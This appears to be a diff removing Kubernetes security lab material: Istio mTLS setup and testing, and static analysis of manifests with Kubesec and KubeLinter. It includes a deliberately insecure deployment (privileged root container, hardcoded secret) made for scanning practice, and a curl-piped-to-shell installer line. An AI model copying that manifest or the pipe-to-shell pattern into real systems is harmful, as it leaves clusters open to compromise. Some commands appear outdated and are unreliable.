-# Kubernetes Cluster Upgrade Documentation
-
-## Upgrade Details
-- **Date**: $(date)
-- **Previous Version**: 1.27.x
-- **New Version**: 1.28.0
-- **Upgrade Method**: kubeadm
-
-## Pre-Upgrade State
-- Cluster was healthy with all nodes ready
-- All system pods were running
-- etcd backup created successfully
-
-## Upgrade Steps Performed
-1. Updated kubeadm to target version
-2. Ran kubeadm upgrade plan
-3. Applied upgrade with kubeadm upgrade apply
-4. Updated kubelet and kubectl
-5. Applied security patches
-6. Validated cluster functionality
-
-## Post-Upgrade Validation
-- All nodes are ready and running target version
-- System pods are healthy
-- Basic functionality tests passed
-- DNS resolution working correctly
-
-## Rollback Procedure (if needed)
-1. Restore etcd from backup: $BACKUP_DIR/etcd-snapshot.db
-2. Restore configuration files from: $BACKUP_DIR/
-3. Downgrade kubeadm, kubelet, kubectl packages
-4. Run kubeadm upgrade apply with previous version
-
-## Security Enhancements Applied
-- API server hardened with IP restrictions
-- mTLS authentication enabled
-- Unused components disabled
-- CIS benchmark remediations applied
-- Latest security patches installed
-EOF
-
-echo "Upgrade documentation created: upgrade-documentation.md"
-
-Troubleshooting Common Issues
-API Server Issues
-
-If the API server fails to start after hardening:
-
-# Check API server logs
-sudo journalctl -u kubelet -f | grep apiserver
-
-# Restore from backup if needed
-sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml.backup /etc/kubernetes/manifests/kube-apiserver.yaml
-
-# Verify certificate validity
-openssl x509 -in /etc/kubernetes/pki/apiserver.crt -text -noout
-
-Certificate Issues
-
-If client certificate authentication fails:
-
-# Verify certificate chain
-openssl verify -CAfile /etc/kubernetes/pki/ca.crt /etc/kubernetes/pki/clients/admin-client.crt
-
-# Regenerate certificates if needed
-sudo openssl x509 -req -in /etc/kubernetes/pki/clients/admin-client.csr \
-  -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key \
-  -out /etc/kubernetes/pki/clients/admin-client.crt -days 365
-
-Upgrade Rollback
-
-If upgrade fails and rollback is needed:
-
-# Restore etcd from backup
-sudo ETCDCTL_API=3 etcdctl snapshot restore $BACKUP_DIR/etcd-snapshot.db \
-  --data-dir=/var/lib/etcd-restore
-
-# Stop etcd and replace data directory
-sudo systemctl stop etcd
-sudo mv /var/lib/etcd /var/lib/etcd-backup
-sudo mv /var/lib/etcd-restore /var/lib/etcd
-sudo systemctl start etcd
-
-Conclusion
-
-In this comprehensive lab, you have successfully:
-
-• Hardened the Kubernetes API server by implementing IP-based access controls and mutual TLS authentication, significantly reducing the attack surface and ensuring only authorized clients can access the cluster
-
-• Identified and disabled unused components while validating your security posture against industry-standard CIS Kubernetes Benchmarks, demonstrating how to maintain a minimal and secure cluster configuration
-
-• Executed a controlled Kubernetes version upgrade from planning through validation, including the application of security patches and comprehensive testing to ensure cluster stability
-
-• Implemented security best practices including proper certificate management, RBAC cleanup, audit logging, and admission control policies that are essential for production Kubernetes environments
-
-These skills are critical for maintaining secure, up-to-date Kubernetes clusters in production environments. The hardening techniques you've learned help protect against common attack vectors, while the upgrade procedures ensure you can safely maintain cluster currency with the latest security patches and features.
-
-The combination of proactive security hardening, continuous compliance validation through CIS benchmarks, and systematic upgrade procedures forms the foundation of a robust Kubernetes security strategy. These practices are essential for anyone pursuing the Certified Kubernetes Security Specialist (CKS) certification and for maintaining production Kubernetes environments.
-
-Remember to regularly review and update your security configurations, perform routine CIS benchmark assessments, and maintain a disciplined approach to cluster upgrades to ensure ongoing security and stability of your
-
-
-
-
-
-Lab 9: Implementing Pod-to-Pod Encryption
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Deploy and configure Istio service mesh on a Kubernetes cluster • Implement mutual TLS (mTLS) for secure Pod-to-Pod communication • Configure automatic and strict mTLS policies across the service mesh • Test and verify encrypted traffic between Pods using various methods • Monitor and analyze encrypted traffic flows using Istio observability tools • Troubleshoot common mTLS configuration issues • Understand the security benefits of service mesh encryption
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Kubernetes concepts (Pods, Services, Deployments) • Familiarity with kubectl command-line tool • Knowledge of TLS/SSL encryption concepts • Understanding of network security principles • Experience with YAML configuration files • Basic Linux command-line skills
-
-Note: Al Nafi provides ready-to-use Linux-based cloud machines with Kubernetes pre-installed. Simply click Start Lab to begin - no need to build your own VM or install Kubernetes.
-Lab Environment Setup
-
-Your cloud machine comes pre-configured with: • Kubernetes cluster (3 nodes) • kubectl configured and ready to use • Docker runtime • curl and other networking tools
-Task 1: Installing and Configuring Istio Service Mesh
-Subtask 1.1: Download and Install Istio
-
-First, we'll download and install the latest stable version of Istio.
-
-# Download Istio
-curl -L https://istio.io/downloadIstio | sh -
-
-# Move to Istio directory
-cd istio-*
-
-# Add istioctl to PATH
-export PATH=$PWD/bin:$PATH
-
-# Verify installation
-istioctl version
-
-Subtask 1.2: Install Istio on Kubernetes Cluster
-
-Install Istio using the demo configuration profile, which includes all core components.
-
-# Install Istio with demo profile
-istioctl install --set values.defaultRevision=default -y
-
-# Verify installation
-kubectl get pods -n istio-system
-
-# Wait for all pods to be running
-kubectl wait --for=condition=ready pod --all -n istio-system --timeout=300s
-
-Subtask 1.3: Enable Automatic Sidecar Injection
-
-Configure automatic sidecar injection for the default namespace.
-
-# Label the default namespace for automatic sidecar injection
-kubectl label namespace default istio-injection=enabled
-
-# Verify the label
-kubectl get namespace default --show-labels
-
-Task 2: Deploying Sample Applications
-Subtask 2.1: Create Sample Applications
-
-We'll deploy two sample applications to test Pod-to-Pod encryption.
-
-Create the first application (frontend):
-
-cat <<EOF | kubectl apply -f -
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: frontend
-  labels:
-    app: frontend
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: frontend
-  template:
-    metadata:
-      labels:
-        app: frontend
-    spec:
-      containers:
-      - name: frontend
-        image: nginx:1.21
-        ports:
-        - containerPort: 80
-        volumeMounts:
-        - name: html
-          mountPath: /usr/share/nginx/html
-      volumes:
-      - name: html
-        configMap:
-          name: frontend-config
----
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: frontend-config
-data:
-  index.html: |
-    <html>
-    <head><title>Frontend Service</title></head>
-    <body>
-    <h1>Frontend Application</h1>
-    <p>This is the frontend service running with Istio sidecar.</p>
-    </body>
-    </html>
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: frontend
-  labels:
-    app: frontend
-spec:
-  ports:
-  - port: 80
-    targetPort: 80
-  selector:
-    app: frontend
-EOF
-
-Create the second application (backend):
-
-cat <<EOF | kubectl apply -f -
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: backend
-  labels:
-    app: backend
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: backend
-  template:
-    metadata:
-      labels:
-        app: backend
-    spec:
-      containers:
-      - name: backend
-        image: httpd:2.4
-        ports:
-        - containerPort: 80
-        volumeMounts:
-        - name: html
-          mountPath: /usr/local/apache2/htdocs
-      volumes:
-      - name: html
-        configMap:
-          name: backend-config
----
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: backend-config
-data:
-  index.html: |
-    <html>
-    <head><title>Backend Service</title></head>
-    <body>
-    <h1>Backend Application</h1>
-    <p>This is the backend service with secure communication.</p>
-    <p>Current time: $(date)</p>
-    </body>
-    </html>
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: backend
-  labels:
-    app: backend
-spec:
-  ports:
-  - port: 80
-    targetPort: 80
-  selector:
-    app: backend
-EOF
-
-Subtask 2.2: Verify Application Deployment
-
-Check that both applications are running with Istio sidecars:
-
-# Check pod status
-kubectl get pods
-
-# Verify sidecar injection (should show 2/2 containers)
-kubectl get pods -o wide
-
-# Check services
-kubectl get services
-
-Each pod should show 2/2 containers, indicating the main application container and the Istio sidecar proxy.
-Task 3: Implementing Mutual TLS (mTLS)
-Subtask 3.1: Check Current mTLS Status
-
-Before configuring mTLS, let's check the current security status:
-
-# Check mTLS status for all services
-istioctl authn tls-check
-
-# Check specific service mTLS status
-istioctl authn tls-check frontend.default.svc.cluster.local
-
-Subtask 3.2: Configure Automatic mTLS
-
-Istio automatically enables mTLS between services with sidecars. Let's verify this is working:
-
-# Create a test pod to check connectivity
-kubectl run test-pod --image=curlimages/curl:7.85.0 --rm -it --restart=Never -- sh
-
-# Inside the test pod, try to access the services
-curl -v http://frontend.default.svc.cluster.local
-curl -v http://backend.default.svc.cluster.local
-
-Exit the test pod by typing exit.
-Subtask 3.3: Configure Strict mTLS Policy
-
-Create a strict mTLS policy to enforce encrypted communication:
-
-cat <<EOF | kubectl apply -f -
-apiVersion: security.istio.io/v1beta1
-kind: PeerAuthentication
-metadata:
-  name: default-strict-mtls
-  namespace: default
-spec:
-  mtls:
-    mode: STRICT
-EOF
-
-Subtask 3.4: Verify Strict mTLS Enforcement
-
-Test that non-mTLS traffic is now blocked:
-
-# Create a pod without Istio sidecar in a different namespace
-kubectl create namespace test-no-istio
-
-# Deploy a test pod without sidecar injection
-kubectl run test-no-sidecar --image=curlimages/curl:7.85.0 --rm -it --restart=Never -n test-no-istio -- sh
-
-# Try to access services (this should fail)
-curl -v http://frontend.default.svc.cluster.local --max-time 10
-
-This should fail because the test pod doesn't have an Istio sidecar and can't establish mTLS connection.
-Task 4: Testing Encrypted Traffic Between Pods
-Subtask 4.1: Test Internal Pod Communication
-
-Create a client pod with Istio sidecar to test encrypted communication:
-
-cat <<EOF | kubectl apply -f -
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: client
-  labels:
-    app: client
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: client
-  template:
-    metadata:
-      labels:
-        app: client
-    spec:
-      containers:
-      - name: client
-        image: curlimages/curl:7.85.0
-        command: ["/bin/sh"]
-        args: ["-c", "while true; do sleep 30; done"]
-EOF
-
-Subtask 4.2: Verify Encrypted Communication
-
-Test communication between pods with mTLS:
-
-# Get the client pod name
-CLIENT_POD=$(kubectl get pod -l app=client -o jsonpath='{.items[0].metadata.name}')
-
-# Test communication to frontend
-kubectl exec -it $CLIENT_POD -- curl -s http://frontend.default.svc.cluster.local
-
-# Test communication to backend
-kubectl exec -it $CLIENT_POD -- curl -s http://backend.default.svc.cluster.local
-
-# Test with verbose output to see connection details
-kubectl exec -it $CLIENT_POD -- curl -v http://frontend.default.svc.cluster.local
-
-Subtask 4.3: Analyze Certificate Information
-
-Check the mTLS certificates being used:
-
-# Check certificate details for frontend service
-istioctl proxy-config secret $CLIENT_POD
-
-# Get detailed certificate information
-kubectl exec -it $CLIENT_POD -c istio-proxy -- openssl s_client -connect frontend.default.svc.cluster.local:80 -servername frontend.default.svc.cluster.local < /dev/null
-
-Task 5: Monitoring and Verifying Encrypted Traffic
-Subtask 5.1: Install Istio Observability Tools
-
-Deploy Kiali, Prometheus, and Grafana for monitoring:
-
-# Install observability addons
-kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/prometheus.yaml
-kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/grafana.yaml
-kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/kiali.yaml
-
-# Wait for deployments to be ready
-kubectl wait --for=condition=available --timeout=300s deployment/kiali -n istio-system
-kubectl wait --for=condition=available --timeout=300s deployment/prometheus -n istio-system
-kubectl wait --for=condition=available --timeout=300s deployment/grafana -n istio-system
-
-Subtask 5.2: Generate Traffic for Monitoring
-
-Create continuous traffic between services:
-
-# Create a script to generate traffic
-cat <<EOF > generate-traffic.sh
-#!/bin/bash
-CLIENT_POD=\$(kubectl get pod -l app=client -o jsonpath='{.items[0].metadata.name}')
-while true; do
-  kubectl exec -it \$CLIENT_POD -- curl -s http://frontend.default.svc.cluster.local > /dev/null
-  kubectl exec -it \$CLIENT_POD -- curl -s http://backend.default.svc.cluster.local > /dev/null
-  sleep 2
-done
-EOF
-
-chmod +x generate-traffic.sh
-
-# Run traffic generation in background
-./generate-traffic.sh &
-TRAFFIC_PID=$!
-
-Subtask 5.3: Access Kiali Dashboard
-
-Open Kiali dashboard to visualize service mesh traffic:
-
-# Port forward Kiali dashboard
-kubectl port-forward -n istio-system service/kiali 20001:20001 &
-KIALI_PID=$!
-
-echo "Kiali dashboard available at: http://localhost:20001"
-echo "Username: admin, Password: admin"
-
-Note: In a real environment, you would access this through your browser. The dashboard shows: • Service topology and traffic flow • mTLS status indicators (lock icons) • Traffic metrics and success rates • Security policies in effect
-Subtask 5.4: Monitor mTLS Status
-
-Use command-line tools to monitor mTLS status:
-
-# Check mTLS status for all workloads
-istioctl authn tls-check
-
-# Get detailed proxy configuration
-istioctl proxy-config cluster $CLIENT_POD --fqdn frontend.default.svc.cluster.local
-
-# Check security policies
-kubectl get peerauthentication -A
-kubectl get destinationrule -A
-
-Subtask 5.5: Verify Traffic Encryption with tcpdump
-
-Capture and analyze network traffic to verify encryption:
-
-# Get the frontend pod name
-FRONTEND_POD=$(kubectl get pod -l app=frontend -o jsonpath='{.items[0].metadata.name}')
-
-# Capture traffic on the frontend pod
-kubectl exec -it $FRONTEND_POD -c istio-proxy -- tcpdump -i any -n -A port 15001 &
-TCPDUMP_PID=$!
-
-# Generate some traffic
-kubectl exec -it $CLIENT_POD -- curl http://frontend.default.svc.cluster.local
-
-# Stop tcpdump after a few seconds
-sleep 5
-kill $TCPDUMP_PID 2>/dev/null
-
-The captured traffic should show encrypted data, not plain text HTTP requests.
-Task 6: Testing Unauthorized Access Blocking
-Subtask 6.1: Create Unauthorized Client
-
-Deploy a service without proper mTLS configuration:
-
-# Create a namespace without Istio injection
-kubectl create namespace unauthorized
-
-# Deploy a client without sidecar
-cat <<EOF | kubectl apply -f -
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: unauthorized-client
-  namespace: unauthorized
-  labels:
-    app: unauthorized-client
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: unauthorized-client
-  template:
-    metadata:
-      labels:
-        app: unauthorized-client
-    spec:
-      containers:
-      - name: client
-        image: curlimages/curl:7.85.0
-        command: ["/bin/sh"]
-        args: ["-c", "while true; do sleep 30; done"]
-EOF
-
-Subtask 6.2: Test Access Blocking
-
-Verify that unauthorized access is blocked:
-
-# Get unauthorized client pod name
-UNAUTH_POD=$(kubectl get pod -l app=unauthorized-client -n unauthorized -o jsonpath='{.items[0].metadata.name}')
-
-# Try to access services (should fail)
-kubectl exec -it $UNAUTH_POD -n unauthorized -- curl -v --max-time 10 http://frontend.default.svc.cluster.local
-
-# Try to access backend (should also fail)
-kubectl exec -it $UNAUTH_POD -n unauthorized -- curl -v --max-time 10 http://backend.default.svc.cluster.local
-
-These requests should fail with connection timeout or connection refused errors.
-Subtask 6.3: Verify Error Logs
-
-Check the Istio proxy logs to see blocked connections:
-
-# Check frontend proxy logs for blocked connections
-kubectl logs $FRONTEND_POD -c istio-proxy | grep -i "tls\|ssl\|handshake"
-
-# Check backend proxy logs
-BACKEND_POD=$(kubectl get pod -l app=backend -o jsonpath='{.items[0].metadata.name}')
-kubectl logs $BACKEND_POD -c istio-proxy | grep -i "tls\|ssl\|handshake"
-
-Task 7: Advanced mTLS Configuration
-Subtask 7.1: Configure Selective mTLS
-
-Create a more granular mTLS policy for specific services:
-
-cat <<EOF | kubectl apply -f -
-apiVersion: security.istio.io/v1beta1
-kind: PeerAuthentication
-metadata:
-  name: backend-strict-mtls
-  namespace: default
-spec:
-  selector:
-    matchLabels:
-      app: backend
-  mtls:
-    mode: STRICT
----
-apiVersion: security.istio.io/v1beta1
-kind: PeerAuthentication
-metadata:
-  name: frontend-permissive-mtls
-  namespace: default
-spec:
-  selector:
-    matchLabels:
-      app: frontend
-  mtls:
-    mode: PERMISSIVE
-EOF
-
-Subtask 7.2: Test Selective Policies
-
-Test the different mTLS modes:
-
-# Test access to backend (should require mTLS)
-kubectl exec -it $CLIENT_POD -- curl -v http://backend.default.svc.cluster.local
-
-# Test access to frontend (should allow both mTLS and plain text)
-kubectl exec -it $CLIENT_POD -- curl -v http://frontend.default.svc.cluster.local
-
-# Test from unauthorized client to frontend (should work in PERMISSIVE mode)
-kubectl exec -it $UNAUTH_POD -n unauthorized -- curl -v --max-time 10 http://frontend.default.svc.cluster.local
-
-Task 8: Troubleshooting Common Issues
-Subtask 8.1: Debug mTLS Configuration
-
-Common troubleshooting commands:
-
-# Check Istio configuration status
-istioctl analyze
-
-# Verify proxy configuration
-istioctl proxy-status
-
-# Check certificate rotation
-istioctl proxy-config secret $CLIENT_POD -o json | jq '.dynamicActiveSecrets[0].secret.tlsCertificate.certificateChain.inlineBytes' | base64 -d | openssl x509 -text -noout
-
-# Debug specific service connectivity
-istioctl proxy-config listeners $CLIENT_POD --port 80
-
-Subtask 8.2: Common Issues and Solutions
-
-Issue 1: Pods showing 1/2 containers ready
-
-# Check sidecar injection
-kubectl describe pod $FRONTEND_POD
-
-# Verify namespace labeling
-kubectl get namespace default --show-labels
-
-Issue 2: mTLS not working
-
-# Check PeerAuthentication policies
-kubectl get peerauthentication -A -o yaml
-
-# Verify Istio installation
-kubectl get pods -n istio-system
-
-Issue 3: Connection timeouts
-
-# Check service endpoints
-kubectl get endpoints
-
-# Verify DNS resolution
-kubectl exec -it $CLIENT_POD -- nslookup frontend.default.svc.cluster.local
-
-Cleanup
-
-Stop background processes and clean up resources:
-
-# Stop traffic generation
-kill $TRAFFIC_PID 2>/dev/null
-
-# Stop port forwarding
-kill $KIALI_PID 2>/dev/null
-
-# Remove test resources
-kubectl delete namespace unauthorized
-kubectl delete deployment client frontend backend
-kubectl delete service frontend backend
-kubectl delete configmap frontend-config backend-config
-kubectl delete peerauthentication --all
-
-# Remove Istio (optional)
-# istioctl uninstall --purge -y
-
-Conclusion
-
-In this comprehensive lab, you have successfully:
-
-• Deployed Istio service mesh on a Kubernetes cluster and configured automatic sidecar injection • Implemented mutual TLS (mTLS) to secure Pod-to-Pod communication with both automatic and strict policies • Tested encrypted traffic flows between services and verified that unauthorized access is properly blocked • Monitored encrypted traffic using Istio's observability tools including Kiali, Prometheus, and network analysis • Configured advanced mTLS policies with selective enforcement for different services • Troubleshot common issues and learned debugging techniques for service mesh security
-
-Why This Matters: Pod-to-Pod encryption using service mesh technology like Istio provides several critical security benefits:
-
-• Zero-trust networking - All communication is encrypted by default • Automatic certificate management - No manual certificate handling required • Policy-based security - Granular control over which services can communicate • Compliance requirements - Meets regulatory requirements for data in transit • Observability - Complete visibility into secure communication patterns
-
-This knowledge is essential for the Certified Kubernetes Security Specialist (CKS) certification and real-world Kubernetes security implementations. Service mesh encryption is becoming a standard practice in production environments where security and compliance are paramount.
-
-The skills you've learned here directly apply to securing microservices architectures, implementing zero-trust networking principles, and maintaining compliance in cloud-native environments.
-
-
-
-
-
-
-Lab 10: Static Analysis and Compliance in CI/CD
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Configure a CI/CD pipeline to perform static analysis of container images and Kubernetes manifests • Integrate Kubesec and KubeLinter to identify security misconfigurations in deployment files • Implement image registry restrictions and enforce compliance policies using admission controllers • Understand the importance of security scanning in the software development lifecycle • Apply security best practices for container and Kubernetes deployments
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Kubernetes concepts (pods, deployments, services) • Familiarity with Docker containers and container images • Basic knowledge of CI/CD pipeline concepts • Understanding of YAML file structure • Basic Linux command-line experience • Knowledge of Git version control system
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to begin - no need to build your own VM or install additional software.
-
-Your lab environment includes: • Ubuntu 20.04 LTS with Docker installed • Kubernetes cluster (kind) pre-configured • Git, curl, and other essential tools • Internet access for downloading tools and images
-Task 1: Setting Up the Lab Environment
-Subtask 1.1: Verify Environment and Install Required Tools
-
-First, let's verify our environment and install the necessary tools for static analysis.
-
-    Check the current environment:
-
-# Verify Docker is running
-docker --version
-sudo systemctl status docker
-
-# Check if Kubernetes cluster is available
-kubectl cluster-info
-kubectl get nodes
-
-    Install Kubesec for Kubernetes manifest analysis:
-
-# Download and install Kubesec
-curl -sSX GET https://api.github.com/repos/controlplaneio/kubesec/releases/latest \
-  | grep browser_download_url \
-  | grep linux-amd64 \
-  | cut -d '"' -f 4 \
-  | xargs curl -sSL -o kubesec
-
-# Make it executable and move to PATH
-chmod +x kubesec
-sudo mv kubesec /usr/local/bin/
-
-# Verify installation
-kubesec version
-
-    Install KubeLinter for additional manifest analysis:
-
-# Download and install KubeLinter
-curl -L https://github.com/stackrox/kube-linter/releases/download/0.6.8/kube-linter-linux.tar.gz \
-  | tar xz
-
-# Move to PATH
-sudo mv kube-linter /usr/local/bin/
-
-# Verify installation
-kube-linter version
-
-    Install Trivy for container image scanning:
-
-# Install Trivy
-sudo apt-get update
-sudo apt-get install wget apt-transport-https gnupg lsb-release -y
-
-wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
-echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
-
-sudo apt-get update
-sudo apt-get install trivy -y
-
-# Verify installation
-trivy --version
-
-Subtask 1.2: Create Project Structure
-
-    Create a project directory structure:
-
-# Create main project directory
-mkdir -p ~/security-lab
-cd ~/security-lab
-
-# Create subdirectories for different components
-mkdir -p {manifests,policies,scripts,reports}
-
-# Create a sample application directory
-mkdir -p app
-
-    Initialize a Git repository:
-
-# Initialize Git repository
-git init
-git config user.name "Security Lab User"
-git config user.email "user@securitylab.com"
-
-# Create initial README
-cat > README.md << 'EOF'
-# Security Lab - Static Analysis and Compliance
-
-This repository contains Kubernetes manifests and CI/CD configurations for security analysis.
-
-## Structure
-- `manifests/` - Kubernetes YAML files
-- `policies/` - Security policies and admission controllers
-- `scripts/` - Automation scripts
-- `reports/` - Security scan reports
-EOF
-
-git add README.md
-git commit -m "Initial commit"
-
-Task 2: Creating Sample Applications and Manifests
-Subtask 2.1: Create Vulnerable Kubernetes Manifests
-
-Let's create some intentionally vulnerable Kubernetes manifests to demonstrate security scanning.
-
-    Create a vulnerable deployment manifest:
-
-cat > manifests/vulnerable-app.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: vulnerable-app
-  namespace: default
-spec:
-  replicas: 2
-  selector:
-    matchLabels:
-      app: vulnerable-app
-  template:
-    metadata:
-      labels:
-        app: vulnerable-app
-    spec:
-      containers:
-      - name: app
-        image: nginx:1.14
-        ports:
-        - containerPort: 80
-        securityContext:
-          runAsUser: 0
-          privileged: true
-          allowPrivilegeEscalation: true
-        resources: {}
-        env:
-        - name: SECRET_KEY
-          value: "hardcoded-secret-123"
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: vulnerable-app-service
-spec:
-  selector:
-    app: vulnerable-app
-  ports:
-  - port: 80
-    targetPort: 80
-  type: LoadBalancer
-EOF
-
-    Create a more secure deployment for comparison:
-
-cat > manifests/secure-app.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: secure-app
-  namespace: default
-spec:
-  replicas: 2
-  selector:
-    matchLabels:
-      app: secure-app
-  template:
-    metadata:
-      labels:
-        app: secure-app
-    spec:
-      securityContext:
-        runAsNonRoot: true
-        runAsUser: 1000
-        fsGroup: 2000
-      containers:
-      - name: app
-        image: nginx:1.21-alpine
-        ports:
-        - containerPort: 8080
-        securityContext:
-          runAsNonRoot: true
-          runAsUser: 1000
-          allowPrivilegeEscalation: false
-          readOnlyRootFilesystem: true
-          capabilities:
-            drop:
-            - ALL
-        resources:
-          requests:
-            memory: "64Mi"
-            cpu: "250m"
-          limits:
-            memory: "128Mi"
-            cpu: "500m"
-        livenessProbe:
-          httpGet:
-            path: /
-            port: 8080
-          initialDelaySeconds: 30
-          periodSeconds: 10
-        readinessProbe:
-          httpGet:
-            path: /
-            port: 8080
-          initialDelaySeconds: 5
-          periodSeconds: 5
-        env:
-        - name: SECRET_KEY
-          valueFrom:
-            secretKeyRef:
-              name: app-secret
-              key: secret-key
----
-apiVersion: v1
-kind: Secret
-metadata:
-  name: app-secret
-type: Opaque
-data:
-  secret-key: bXktc2VjcmV0LWtleQ==
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: secure-app-service
-spec:
-  selector:
-    app: secure-app
-  ports:
-  - port: 80
-    targetPort: 8080
-  type: ClusterIP
-EOF
-
-Subtask 2.2: Create Network Policies
-
-    Create a network policy for security:
-
-cat > manifests/network-policy.yaml << 'EOF'
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: default-deny-all
-  namespace: default
-spec:
-  podSelector: {}
-  policyTypes:
-  - Ingress
-  - Egress
----
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: allow-secure-app
-  namespace: default
-spec:
-  podSelector:
-    matchLabels:
-      app: secure-app
-  policyTypes:
-  - Ingress
-  - Egress
-  ingress:
-  - from:
-    - podSelector:
-        matchLabels:
-          app: frontend
-    ports:
-    - protocol: TCP
-      port: 8080
-  egress:
-  - to: []
-    ports:
-    - protocol: TCP
-      port: 53
-    - protocol: UDP
-      port: 53
-EOF
-
-Task 3: Implementing Static Analysis with Kubesec and KubeLinter
-Subtask 3.1: Analyze Manifests with Kubesec
-
-    Run Kubesec analysis on vulnerable manifest:
-
-# Analyze the vulnerable deployment
-kubesec scan manifests/vulnerable-app.yaml
-
-# Save the results to a report file
-kubesec scan manifests/vulnerable-app.yaml > reports/kubesec-vulnerable-report.json
-
-# View the report in a readable format
-cat reports/kubesec-vulnerable-report.json | jq '.'
-
-    Run Kubesec analysis on secure manifest:
-
-# Analyze the secure deployment
-kubesec scan manifests/secure-app.yaml > reports/kubesec-secure-report.json
-
-# Compare the scores
-echo "Vulnerable app score:"
-cat reports/kubesec-vulnerable-report.json | jq '.[0].score'
-
-echo "Secure app score:"
-cat reports/kubesec-secure-report.json | jq '.[0].score'
-
-    Create a script to automate Kubesec scanning:
-
-cat > scripts/kubesec-scan.sh << 'EOF'
-#!/bin/bash
-
-# Kubesec scanning script
-MANIFEST_DIR="manifests"
-REPORT_DIR="reports"
-
-echo "Starting Kubesec security analysis..."
-
-# Create reports directory if it doesn't exist
-mkdir -p $REPORT_DIR
-
-# Scan all YAML files in manifests directory
-for file in $MANIFEST_DIR/*.yaml; do
-    if [ -f "$file" ]; then
-        filename=$(basename "$file" .yaml)
-        echo "Scanning $file..."
-        
-        # Run kubesec scan and save results
-        kubesec scan "$file" > "$REPORT_DIR/kubesec-$filename.json"
-        
-        # Extract and display score
-        score=$(cat "$REPORT_DIR/kubesec-$filename.json" | jq -r '.[0].score // "N/A"')
-        echo "Security score for $filename: $score"
-        
-        # Check if score is below threshold
-        if [ "$score" != "N/A" ] && [ "$score" -lt 0 ]; then
-            echo "WARNING: $filename has a negative security score!"
-            echo "Critical issues found:"
-            cat "$REPORT_DIR/kubesec-$filename.json" | jq -r '.[0].scoring.critical[]?.reason // empty'
-        fi
-        echo "---"
-    fi
-done
-
-echo "Kubesec analysis complete. Reports saved in $REPORT_DIR/"
-EOF
-
-chmod +x scripts/kubesec-scan.sh
-
-    Run the automated Kubesec scan:
-
-./scripts/kubesec-scan.sh
-
-Subtask 3.2: Analyze Manifests with KubeLinter
-
-    Run KubeLinter analysis:
-
-# Analyze all manifests with KubeLinter
-kube-linter lint manifests/
-
-# Save detailed results to a file
-kube-linter lint manifests/ --format json > reports/kubelinter-report.json
-
-# View summary of issues
-kube-linter lint manifests/ --format sarif > reports/kubelinter-sarif.json
-
-    Create a custom KubeLinter configuration:
-
-cat > policies/kubelinter-config.yaml << 'EOF'
-checks:
-  # Security-focused checks
-  doNotAutoMount: true
-  noReadOnlyRootFilesystem: true
-  privilegedContainer: true
-  runAsNonRoot: true
-  sensitiveContainerEnvVar: true
-  
-  # Resource and reliability checks
-  cpuRequirements: true
-  memoryRequirements: true
-  livenessProbe: true
-  readinessProbe: true
-  
-  # Network security
-  hostNetwork: true
-  hostPID: true
-  hostIPC: true
-
-customChecks: []
-EOF
-
-    Run KubeLinter with custom configuration:
-
-# Run with custom config
-kube-linter lint --config policies/kubelinter-config.yaml manifests/ > reports/kubelinter-custom.txt
-
-# Display the results
-cat reports/kubelinter-custom.txt
-
-    Create a KubeLinter automation script:
-
-cat > scripts/kubelinter-scan.sh << 'EOF'
-#!/bin/bash
-
-# KubeLinter scanning script
-MANIFEST_DIR="manifests"
-REPORT_DIR="reports"
-CONFIG_FILE="policies/kubelinter-config.yaml"
-
-echo "Starting KubeLinter security analysis..."
-
-# Create reports directory if it doesn't exist
-mkdir -p $REPORT_DIR
-
-# Run KubeLinter with different output formats
-echo "Running comprehensive scan..."
-
-# JSON format for programmatic processing
-kube-linter lint $MANIFEST_DIR --format json > $REPORT_DIR/kubelinter-full.json
-
-# Plain text for human reading
-kube-linter lint $MANIFEST_DIR > $REPORT_DIR/kubelinter-summary.txt
-
-# SARIF format for integration with other tools
-kube-linter lint $MANIFEST_DIR --format sarif > $REPORT_DIR/kubelinter-sarif.json
-
-# Count issues by severity
-echo "Issue Summary:"
-echo "==============="
-
-# Extract and count issues
-if [ -f "$REPORT_DIR/kubelinter-full.json" ]; then
-    total_issues=$(cat $REPORT_DIR/kubelinter-full.json | jq '.Issues | length')
-    echo "Total issues found: $total_issues"
-    
-    # Group by check name
-    echo "Issues by type:"
-    cat $REPORT_DIR/kubelinter-full.json | jq -r '.Issues[] | .Check' | sort | uniq -c | sort -nr
-else
-    echo "No issues data available"
-fi
-
-echo "KubeLinter analysis complete. Reports saved in $REPORT_DIR/"
-EOF
-
-chmod +x scripts/kubelinter-scan.sh
-
-    Run the KubeLinter automation script:
-
-./scripts/kubelinter-scan.sh
-
